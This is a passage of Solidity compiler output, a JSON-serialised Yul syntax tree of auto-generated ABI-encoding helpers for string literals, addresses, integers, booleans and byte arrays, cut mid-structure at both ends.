],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"9048:3:15"},"nodeType":"YulFunctionCall","src":"9048:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"9041:3:15"}]}]},"name":"abi_encode_t_stringliteral_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"8834:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"8842:3:15","type":""}],"src":"8700:366:15"},{"body":{"nodeType":"YulBlock","src":"9218:220:15","statements":[{"nodeType":"YulAssignment","src":"9228:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"9294:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"9299:2:15","type":"","value":"41"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"9235:58:15"},"nodeType":"YulFunctionCall","src":"9235:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"9228:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"9400:3:15"}],"functionName":{"name":"store_literal_in_memory_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159","nodeType":"YulIdentifier","src":"9311:88:15"},"nodeType":"YulFunctionCall","src":"9311:93:15"},"nodeType":"YulExpressionStatement","src":"9311:93:15"},{"nodeType":"YulAssignment","src":"9413:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"9424:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"9429:2:15","type":"","value":"64"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"9420:3:15"},"nodeType":"YulFunctionCall","src":"9420:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"9413:3:15"}]}]},"name":"abi_encode_t_stringliteral_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"9206:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"9214:3:15","type":""}],"src":"9072:366:15"},{"body":{"nodeType":"YulBlock","src":"9590:220:15","statements":[{"nodeType":"YulAssignment","src":"9600:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"9666:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"9671:2:15","type":"","value":"32"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"9607:58:15"},"nodeType":"YulFunctionCall","src":"9607:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"9600:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"9772:3:15"}],"functionName":{"name":"store_literal_in_memory_8a66f4bb6512ffbfcc3db9b42318eb65f26ac15163eaa9a1e5cfa7bee9d1c7c6","nodeType":"YulIdentifier","src":"9683:88:15"},"nodeType":"YulFunctionCall","src":"9683:93:15"},"nodeType":"YulExpressionStatement","src":"9683:93:15"},{"nodeType":"YulAssignment","src":"9785:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"9796:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"9801:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"9792:3:15"},"nodeType":"YulFunctionCall","src":"9792:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"9785:3:15"}]}]},"name":"abi_encode_t_stringliteral_8a66f4bb6512ffbfcc3db9b42318eb65f26ac15163eaa9a1e5cfa7bee9d1c7c6_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"9578:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"9586:3:15","type":""}],"src":"9444:366:15"},{"body":{"nodeType":"YulBlock","src":"9962:220:15","statements":[{"nodeType":"YulAssignment","src":"9972:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"10038:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"10043:2:15","type":"","value":"24"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"9979:58:15"},"nodeType":"YulFunctionCall","src":"9979:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"9972:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"10144:3:15"}],"functionName":{"name":"store_literal_in_memory_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f","nodeType":"YulIdentifier","src":"10055:88:15"},"nodeType":"YulFunctionCall","src":"10055:93:15"},"nodeType":"YulExpressionStatement","src":"10055:93:15"},{"nodeType":"YulAssignment","src":"10157:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"10168:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"10173:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"10164:3:15"},"nodeType":"YulFunctionCall","src":"10164:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"10157:3:15"}]}]},"name":"abi_encode_t_stringliteral_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"9950:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"9958:3:15","type":""}],"src":"9816:366:15"},{"body":{"nodeType":"YulBlock","src":"10334:220:15","statements":[{"nodeType":"YulAssignment","src":"10344:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"10410:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"10415:2:15","type":"","value":"48"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"10351:58:15"},"nodeType":"YulFunctionCall","src":"10351:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"10344:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"10516:3:15"}],"functionName":{"name":"store_literal_in_memory_b287e910c6a9cef9f186108b89a3a957a66db6db4d5eed8b59288161d029857b","nodeType":"YulIdentifier","src":"10427:88:15"},"nodeType":"YulFunctionCall","src":"10427:93:15"},"nodeType":"YulExpressionStatement","src":"10427:93:15"},{"nodeType":"YulAssignment","src":"10529:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"10540:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"10545:2:15","type":"","value":"64"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"10536:3:15"},"nodeType":"YulFunctionCall","src":"10536:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"10529:3:15"}]}]},"name":"abi_encode_t_stringliteral_b287e910c6a9cef9f186108b89a3a957a66db6db4d5eed8b59288161d029857b_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"10322:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"10330:3:15","type":""}],"src":"10188:366:15"},{"body":{"nodeType":"YulBlock","src":"10706:220:15","statements":[{"nodeType":"YulAssignment","src":"10716:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"10782:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"10787:2:15","type":"","value":"33"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"10723:58:15"},"nodeType":"YulFunctionCall","src":"10723:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"10716:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"10888:3:15"}],"functionName":{"name":"store_literal_in_memory_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942","nodeType":"YulIdentifier","src":"10799:88:15"},"nodeType":"YulFunctionCall","src":"10799:93:15"},"nodeType":"YulExpressionStatement","src":"10799:93:15"},{"nodeType":"YulAssignment","src":"10901:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"10912:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"10917:2:15","type":"","value":"64"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"10908:3:15"},"nodeType":"YulFunctionCall","src":"10908:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"10901:3:15"}]}]},"name":"abi_encode_t_stringliteral_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"10694:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"10702:3:15","type":""}],"src":"10560:366:15"},{"body":{"nodeType":"YulBlock","src":"11078:220:15","statements":[{"nodeType":"YulAssignment","src":"11088:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"11154:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"11159:2:15","type":"","value":"61"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"11095:58:15"},"nodeType":"YulFunctionCall","src":"11095:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"11088:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"11260:3:15"}],"functionName":{"name":"store_literal_in_memory_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83","nodeType":"YulIdentifier","src":"11171:88:15"},"nodeType":"YulFunctionCall","src":"11171:93:15"},"nodeType":"YulExpressionStatement","src":"11171:93:15"},{"nodeType":"YulAssignment","src":"11273:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"11284:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"11289:2:15","type":"","value":"64"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"11280:3:15"},"nodeType":"YulFunctionCall","src":"11280:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"11273:3:15"}]}]},"name":"abi_encode_t_stringliteral_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"11066:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"11074:3:15","type":""}],"src":"10932:366:15"},{"body":{"nodeType":"YulBlock","src":"11369:53:15","statements":[{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"11386:3:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"11409:5:15"}],"functionName":{"name":"cleanup_t_uint256","nodeType":"YulIdentifier","src":"11391:17:15"},"nodeType":"YulFunctionCall","src":"11391:24:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"11379:6:15"},"nodeType":"YulFunctionCall","src":"11379:37:15"},"nodeType":"YulExpressionStatement","src":"11379:37:15"}]},"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"11357:5:15","type":""},{"name":"pos","nodeType":"YulTypedName","src":"11364:3:15","type":""}],"src":"11304:118:15"},{"body":{"nodeType":"YulBlock","src":"11526:124:15","statements":[{"nodeType":"YulAssignment","src":"11536:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"11548:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"11559:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"11544:3:15"},"nodeType":"YulFunctionCall","src":"11544:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"11536:4:15"}]},{"expression":{"arguments":[{"name":"value0","nodeType":"YulIdentifier","src":"11616:6:15"},{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"11629:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"11640:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"11625:3:15"},"nodeType":"YulFunctionCall","src":"11625:17:15"}],"functionName":{"name":"abi_encode_t_address_to_t_address_fromStack","nodeType":"YulIdentifier","src":"11572:43:15"},"nodeType":"YulFunctionCall","src":"11572:71:15"},"nodeType":"YulExpressionStatement","src":"11572:71:15"}]},"name":"abi_encode_tuple_t_address__to_t_address__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"11498:9:15","type":""},{"name":"value0","nodeType":"YulTypedName","src":"11510:6:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"11521:4:15","type":""}],"src":"11428:222:15"},{"body":{"nodeType":"YulBlock","src":"11856:440:15","statements":[{"nodeType":"YulAssignment","src":"11866:27:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"11878:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"11889:3:15","type":"","value":"128"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"11874:3:15"},"nodeType":"YulFunctionCall","src":"11874:19:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"11866:4:15"}]},{"expression":{"arguments":[{"name":"value0","nodeType":"YulIdentifier","src":"11947:6:15"},{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"11960:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"11971:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"11956:3:15"},"nodeType":"YulFunctionCall","src":"11956:17:15"}],"functionName":{"name":"abi_encode_t_address_to_t_address_fromStack","nodeType":"YulIdentifier","src":"11903:43:15"},"nodeType":"YulFunctionCall","src":"11903:71:15"},"nodeType":"YulExpressionStatement","src":"11903:71:15"},{"expression":{"arguments":[{"name":"value1","nodeType":"YulIdentifier","src":"12028:6:15"},{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"12041:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"12052:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"12037:3:15"},"nodeType":"YulFunctionCall","src":"12037:18:15"}],"functionName":{"name":"abi_encode_t_address_to_t_address_fromStack","nodeType":"YulIdentifier","src":"11984:43:15"},"nodeType":"YulFunctionCall","src":"11984:72:15"},"nodeType":"YulExpressionStatement","src":"11984:72:15"},{"expression":{"arguments":[{"name":"value2","nodeType":"YulIdentifier","src":"12110:6:15"},{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"12123:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"12134:2:15","type":"","value":"64"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"12119:3:15"},"nodeType":"YulFunctionCall","src":"12119:18:15"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nodeType":"YulIdentifier","src":"12066:43:15"},"nodeType":"YulFunctionCall","src":"12066:72:15"},"nodeType":"YulExpressionStatement","src":"12066:72:15"},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"12159:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"12170:2:15","type":"","value":"96"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"12155:3:15"},"nodeType":"YulFunctionCall","src":"12155:18:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"12179:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"12185:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"12175:3:15"},"nodeType":"YulFunctionCall","src":"12175:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"12148:6:15"},"nodeType":"YulFunctionCall","src":"12148:48:15"},"nodeType":"YulExpressionStatement","src":"12148:48:15"},{"nodeType":"YulAssignment","src":"12205:84:15","value":{"arguments":[{"name":"value3","nodeType":"YulIdentifier","src":"12275:6:15"},{"name":"tail","nodeType":"YulIdentifier","src":"12284:4:15"}],"functionName":{"name":"abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"12213:61:15"},"nodeType":"YulFunctionCall","src":"12213:76:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"12205:4:15"}]}]},"name":"abi_encode_tuple_t_address_t_address_t_uint256_t_bytes_memory_ptr__to_t_address_t_address_t_uint256_t_bytes_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"11804:9:15","type":""},{"name":"value3","nodeType":"YulTypedName","src":"11816:6:15","type":""},{"name":"value2","nodeType":"YulTypedName","src":"11824:6:15","type":""},{"name":"value1","nodeType":"YulTypedName","src":"11832:6:15","type":""},{"name":"value0","nodeType":"YulTypedName","src":"11840:6:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"11851:4:15","type":""}],"src":"11656:640:15"},{"body":{"nodeType":"YulBlock","src":"12394:118:15","statements":[{"nodeType":"YulAssignment","src":"12404:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"12416:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"12427:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"12412:3:15"},"nodeType":"YulFunctionCall","src":"12412:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"12404:4:15"}]},{"expression":{"arguments":[{"name":"value0","nodeType":"YulIdentifier","src":"12478:6:15"},{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"12491:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"12502:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"12487:3:15"},"nodeType":"YulFunctionCall","src":"12487:17:15"}],"functionName":{"name":"abi_encode_t_bool_to_t_bool_fromStack","nodeType":"YulIdentifier","src":"12440:37:15"},"nodeType":"YulFunctionCall","src":"12440:65:15"},"nodeType":"YulExpressionStatement","src":"12440:65:15"}]},"name":"abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"12366:9:15","type":""},{"name":"value0","nodeType":"YulTypedName","src":"12378:6:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"12389:4:15","type":""}],"src":"12302:210:15"},{"body":{"nodeType":"YulBlock","src":"12636:195:15","statements":[{"nodeType":"YulAssignment","src":"12646:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"12658:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"12669:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"12654:3:15"},"nodeType":"YulFunctionCall","src":"12654:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"12646:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"12693:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"12704:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"12689:3:15"},"nodeType":"YulFunctionCall","src":"12689:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"12712:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"12718:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"12708:3:15"},"nodeType":"YulFunctionCall","src":"12708:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"12682:6:15"},"nodeType":"YulFunctionCall","src":"12682:47:15"},"nodeType":"YulExpressionStatement","src":"12682:47:15"},{"nodeType":"YulAssignment","src":"12738:86:15","value":{"arguments":[{"name":"value0","nodeType":"YulIdentifier","src":"12810:6:15"},{"name":"tail","nodeType":"YulIdentifier","src":"12819:4:15"}],"functionName":{"name":"abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"12746:63:15"},"nodeType":"YulFunctionCall","src":"12746:78:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"12738:4:15"}]}]},"name":"abi_encode_tuple_t_string_memory_ptr__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"12608:9:15","type":""},{"name":"value0","nodeType":"YulTypedName","src":"12620:6:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"12631:4:15","type":""}],"src":"12518:313:15"},{"body":{"nodeType":"YulBlock","src":"13008:248:15","statements":[{"nodeType":"YulAssignment","src":"13018:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"13030:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"13041:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"13026:3:15"},"nodeType":"YulFunctionCall","src":"13026:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"13018:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"13065:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"13076:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"13061:3:15"},"nodeType":"YulFunctionCall","src":"13061:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"13084:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"13090:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"13080:3:15"},"nodeType":"YulFunctionCall","src":"13080:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"13054:6:15"},"nodeType":"YulFunctionCall","src":"13054:47:15"},"nodeType":"YulExpressionStatement","src":"13054:47:15"},{"nodeType":"YulAssignment","src":"13110:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"13244:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"13118:124:15"},"nodeType":"YulFunctionCall","src":"13118:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"13110:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"12988:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"13003:4:15","type":""}],"src":"12837:419:15"},{"body":{"nodeType":"YulBlock","src":"13433:248:15","statements":[{"nodeType":"YulAssignment","src":"13443:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"13455:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"13466:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"13451:3:15"},"nodeType":"YulFunctionCall","src":"13451:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"13443:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"13490:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"13501:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"13486:3:15"},"nodeType":"YulFunctionCall","src":"13486:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"13509:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"13515:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"13505:3:15"},"nodeType":"YulFunctionCall","src":"13505:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"13479:6:15"},"nodeType":"YulFunctionCall","src":"13479:47:15"},"nodeType":"YulExpressionStatement","src":"13479:47:15"},{"nodeType":"YulAssignment","src":"13535:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"13669:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"13543:124:15"},"nodeType":"YulFunctionCall","src":"13543:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"13535:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"13413:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"13428:4:15","type":""}],"src":"13262:419:15"},{"body":{"nodeType":"YulBlock","src":"13858:248:15","statements":[{"nodeType":"YulAssignment","src":"13868:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"13880:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"13891:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"13876:3:15"},"nodeType":"YulFunctionCall","src":"13876:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"13868:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"13915:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"13926:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"13911:3:15"},"nodeType":"YulFunctionCall","src":"13911:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"13934:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"13940:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"13930:3:15"},"nodeType":"YulFunctionCall","src":"13930:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"13904:6:15"},"nodeType":"YulFunctionCall","src":"13904:47:15"},"nodeType":"YulExpressionStatement","src":"13904:47:15"},{"nodeType":"YulAssignment","src":"13960:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"14094:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"13968:124:15"},"nodeType":"YulFunctionCall","src":"13968:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"13960:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"13838:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"13853:4:15","type":""}],"src":"13687:419:15"},{"body":{"nodeType":"YulBlock","src":"14283:248:15","statements":[{"nodeType":"YulAssignment","src":"14293:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"14305:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"14316:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"14301:3:15"},"nodeType":"YulFunctionCall","src":"14301:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"14293:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"14340:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"14351:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"14336:3:15"},"nodeType":"YulFunctionCall","src":"14336:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"14359:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"14365:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"14355:3:15"},"nodeType":"YulFunctionCall","src":"14355:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"14329:6:15"},"nodeType":"YulFunctionCall","src":"14329:47:15"},"nodeType":"YulExpressionStatement","src":"14329:47:15"},{"nodeType":"YulAssignment","src":"14385:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"14519:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_2a63ce106ef95058ed21fd07c42a10f11dc5c32ac13a4e847923f7759f635d57_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"14393:124:15"},"nodeType":"YulFunctionCall","src":"14393:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"14385:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_2a63ce106ef95058ed21fd07c42a10f11dc5c32ac13a4e847923f7759f635d57__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"14263:9:15","type":""}],"returnVariables":[{"